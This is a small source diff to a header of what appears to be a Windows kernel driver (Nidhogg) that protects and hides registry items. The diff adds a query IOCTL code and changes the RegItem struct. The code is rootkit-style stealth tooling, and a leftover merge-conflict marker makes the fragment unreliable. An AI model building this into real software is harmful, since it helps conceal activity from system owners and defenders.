@@ -44,6 +44,7 @@
 #define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // #define IOCTL_NIDHOGG_HIDE_REGITEM CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS) --> Currently protect and hide is the same, will be changed in the future.
 >>>>>>> 4fc3e3e (Added file query ability)
 // *****************************************************************************************************
@@ -106,7 +107,8 @@ struct FileGlobals {
 FileGlobals fGlobals;
 
 struct RegItem {
-	int Type;
+	int RegItemsIndex;
+	ULONG Type;
 	WCHAR KeyPath[REG_KEY_LEN];
 	WCHAR ValueName[REG_VALUE_LEN];
 };
